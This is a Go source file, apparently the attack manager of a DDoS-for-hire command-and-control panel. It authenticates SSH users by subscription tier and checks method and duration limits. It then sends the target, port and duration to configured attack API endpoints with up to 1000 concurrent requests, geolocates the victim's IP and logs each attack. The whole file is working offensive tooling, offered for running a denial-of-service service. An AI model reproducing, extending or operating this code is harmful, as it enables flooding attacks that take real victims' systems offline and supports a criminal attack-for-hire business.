package managers

import (
	"arismcnc/database"
	"arismcnc/utils"
    "encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gliderlabs/ssh"
)

type MethodInfo struct {
	defaultPort uint16
	defaultTime uint32
	MinTime     uint32
	MaxTime     uint32
}

type Attack struct {
	Duration   uint32
	Type       uint8
	Target     string
	Port       string
	MethodName string
	API        []string
	Enabled    bool
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func applyAPIOptionsToAttack(atk *Attack, session ssh.Session) {
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		return
	}

	_ = config.GetAPIOptions()
}

func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin bool, maxtime int, db *database.Database) (*Attack, error) {
	var atkInfo MethodInfo
	userInfo := db.GetAccountInfo(session.User())
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}

	if len(args) == 1 {
		return nil, errors.New("Invalid number of arguments. Usage: <method> <target> <port> <duration>")
	}

	if len(args) != 4 {
		return nil, errors.New("Invalid number of arguments. Usage: <method> <target> <port> <duration>")
	}

	method, err := utils.GetMethod(args[0])
	if err != nil {
		return nil, fmt.Errorf("\u001B[91mMethod '%s' not found\u001B[0m", args[0])
	}
	
	// DEBUG: Mostra informações do método
	log.Printf("[DEBUG] Method: %s, MinTime: %d, MaxTime: %d, Duration input: %s", 
		args[0], method.MinTime, method.MaxTime, args[3])
	
	insufficientPermissionsBrand := utils.Branding(session, "insufficient-permissions", map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	})

	if utils.HasVipPermission(method.Method) && !vip {
		return nil, errors.New(insufficientPermissionsBrand)
	}
	if utils.HasPrivatePermission(method.Method) && !private {
		return nil, errors.New(insufficientPermissionsBrand)
	}
	if utils.HasAdminPermission(method.Method) && !admin {
		return nil, errors.New(insufficientPermissionsBrand)
	}

	atkInfo = MethodInfo{
		defaultPort: method.DefaultPort,
		defaultTime: method.DefaultTime,
		MinTime:     method.MinTime,
		MaxTime:     method.MaxTime,
	}
	
	// DEBUG: Mostra atkInfo
	log.Printf("[DEBUG] atkInfo MinTime: %d, MaxTime: %d", atkInfo.MinTime, atkInfo.MaxTime)
	
	atk := &Attack{
		MethodName: args[0],
		Target:     args[1],
	}

	port, err := strconv.Atoi(args[2])
	if err != nil {
		return nil, errors.New("\u001B[91mInvalid port.\u001B[0m")
	}
	atk.Port = strconv.Itoa(port)

	// CORREÇÃO: Validação de duração corrigida
	duration, err := strconv.Atoi(args[3])
	if err != nil {
		return nil, errors.New("\u001B[91mInvalid duration format. Must be a number.\u001B[0m")
	}
	
	// DEBUG: Mostra valores após conversão
	log.Printf("[DEBUG] Duration parsed: %d (uint32: %d), MinTime: %d, MaxTime: %d, Maxtime user: %d", 
		duration, uint32(duration), atkInfo.MinTime, atkInfo.MaxTime, maxtime)
	
	// Verifica limites do método
	if uint32(duration) < atkInfo.MinTime {
		return nil, fmt.Errorf("\033[97mInvalid attack duration, near %s. Minimum duration for this method is %d seconds", 
			args[3], atkInfo.MinTime)
	}
	
	if uint32(duration) > atkInfo.MaxTime {
		return nil, fmt.Errorf("\033[97mInvalid attack duration, near %s. Maximum duration for this method is %d seconds", 
			args[3], atkInfo.MaxTime)
	}
	
	// Verifica limite do usuário
	if duration > maxtime {
		return nil, fmt.Errorf("\033[97mInvalid attack duration, near %s. Your maximum allowed duration is %d seconds", 
			args[3], maxtime)
	}
	
	atk.Duration = uint32(duration)
	atk.API = method.API
	atk.Enabled = method.Enabled

	applyAPIOptionsToAttack(atk, session)

	return atk, nil
}

func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, error, string) {
	userInfo := db.GetAccountInfo(session.User())
	apiList := this.API
	apiLen := len(apiList)

	if !this.Enabled {
		return false, errors.New("Method not enabled"), ""
	}

	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		return false, errors.New("Error loading config"), ""
	}

	if !config.IsAttacksEnabled() {
		if userInfo.Admin == 0 || !config.AdminsBypassDisabled() {
			return false, errors.New("Attacks are currently disabled"), ""
		}
	}

	apiOptions := config.GetAPIOptions()
	showHostInfo := apiOptions.ShowHostInfoInAPIResponse

	responses := make(chan string, apiLen)

	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 1000,
			IdleConnTimeout:     30 * time.Second,
		},
		Timeout: 2 * time.Second,
	}

	var wg sync.WaitGroup

	concurrencyLimit := 1000
	sem := make(chan struct{}, concurrencyLimit)

	for _, apiLink := range apiList {
		finalLink := replacePlaceholders(apiLink, this.Target, this.Port, this.Duration)

		wg.Add(1)
		go func(link string) {
			defer wg.Done()

			sem <- struct{}{}
			defer func() { <-sem }()

			res, err := client.Get(link)
			if err != nil {
				log.Printf("[ATTACK] Error sending request to: %s - %v", link, err)
				responses <- fmt.Sprintf("[ATTACK] %s response: error", link)
				return
			}
			defer res.Body.Close()

			_, err = io.Copy(io.Discard, res.Body)
			if err != nil {
				log.Printf("[ATTACK] Error reading response from: %s - %v", link, err)
				responses <- fmt.Sprintf("[ATTACK] %s response: read error", link)
				return
			}

			responses <- fmt.Sprintf("[ATTACK] %s response: sent", link)
		}(finalLink)
	}

	wg.Wait()
	close(responses)
  
	log.Printf("[INFO] Attack to %d targets completed", len(apiList))

	dataMap := make(map[string]string)
	
	if showHostInfo {
		dataMap = this.fetchTargetInfoIPAPI(this.Target)
	} else {
		dataMap = map[string]string{
			"country": "Hidden",
			"org":     "Hidden",
			"region":  "Hidden", 
			"asn":     "Hidden",
			"city":    "Hidden",
			"isp":     "Hidden",
			"timezone": "Hidden",
		}
	}

	lm, err := NewLogManager("./assets/logs/logs.json")
	if err != nil {
		fmt.Println("Error initializing LogManager:", err)
		os.Exit(1)
	}
	defer lm.Close()

	lm.Log("New Attack (C2)!\nUsername: " + session.User() + "\nTarget: " + this.Target + "\nPort: " + this.Port + "\nTime: " + strconv.Itoa(int(this.Duration)) + "\nMethod: " + this.MethodName + "\n----------------------")
	timeString := time.Now().Format("2006-01-02 15:04:05")
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}
	sentMessage := utils.Branding(session, "attack-sent", map[string]interface{}{
		"attack.Target":            this.Target,
		"attack.Port":              this.Port,
		"attack.Time":              strconv.Itoa(int(this.Duration)),
		"attack.Method":            this.MethodName,
		"attack.Country":           dataMap["country"],
		"attack.Org":               dataMap["org"],
		"attack.Region":            dataMap["region"],
		"attack.Asn":               dataMap["asn"],
		"attack.City":              dataMap["city"],
		"attack.ISP":               dataMap["isp"],
		"attack.Timezone":          dataMap["timezone"],
		"attack.Date":              timeString,
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
	})
	log.Println("[INFO] Attack information sent to user interface")
	return false, nil, sentMessage
}

func (this *Attack) fetchTargetInfoIPAPI(ip string) map[string]string {
	dataMap := make(map[string]string)
	
	url := "http://ip-api.com/json/" + ip + "?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,query,zip,timezone"
	
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return this.getBasicInfoFromIP(ip)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return this.getBasicInfoFromIP(ip)
	}

	var result struct {
		Status      string `json:"status"`
		Country     string `json:"country"`
		CountryCode string `json:"countryCode"`
		RegionName  string `json:"regionName"`
		City        string `json:"city"`
		ISP         string `json:"isp"`
		Org         string `json:"org"`
		AS          string `json:"as"`
		Zip         string `json:"zip"`
		Timezone    string `json:"timezone"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return this.getBasicInfoFromIP(ip)
	}
  
	if result.Status != "success" {
		return this.getBasicInfoFromIP(ip)
	}

	dataMap["country"] = result.Country
	dataMap["countrycode"] = result.CountryCode
	dataMap["org"] = result.Org
	if dataMap["org"] == "" {
		dataMap["org"] = result.ISP
	}
	dataMap["region"] = result.RegionName
	dataMap["city"] = result.City
	dataMap["isp"] = result.ISP
	dataMap["asn"] = result.AS
	dataMap["zip"] = result.Zip
	dataMap["timezone"] = result.Timezone

	if dataMap["country"] == "" {
		dataMap["country"] = "Unknown"
	}
	if dataMap["org"] == "" {
		dataMap["org"] = "Unknown"
	}
	if dataMap["region"] == "" {
		dataMap["region"] = "Unknown"
	}
	if dataMap["asn"] == "" {
		dataMap["asn"] = "Unknown"
	}
	if dataMap["zip"] == "" {
		dataMap["zip"] = "Unknown"
	}
	if dataMap["timezone"] == "" {
		dataMap["timezone"] = "Unknown"
	}

	return dataMap
}

func (this *Attack) getBasicInfoFromIP(ip string) map[string]string {
	return map[string]string{
		"country":  "Unknown",
		"org":      "Unknown",
		"region":   "Unknown",
		"asn":      "Unknown",
		"city":     "Unknown",
		"isp":      "Unknown",
		"timezone": "Unknown",
	}
}

func getString(data map[string]interface{}, key string) string {
	if val, ok := data[key]; ok {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

func replacePlaceholders(apiLink string, target string, port string, duration uint32) string {
	apiLink = strings.ReplaceAll(apiLink, "{host}", target)
	apiLink = strings.ReplaceAll(apiLink, "{HOST}", target)
	apiLink = strings.ReplaceAll(apiLink, "{port}", port)
	apiLink = strings.ReplaceAll(apiLink, "{PORT}", port)
	apiLink = strings.ReplaceAll(apiLink, "{time}", strconv.Itoa(int(duration)))
	apiLink = strings.ReplaceAll(apiLink, "{TIME}", strconv.Itoa(int(duration)))
	return apiLink
}

func Contains(methods []utils.Method, s string) bool {
	for _, a := range methods {
		if a.Method == s {
			return true
		}
	}
	return false
}

func ValidIP4(s string) bool {
	ip := net.ParseIP(s)
	if ip == nil {
		return false
	}
	return true
}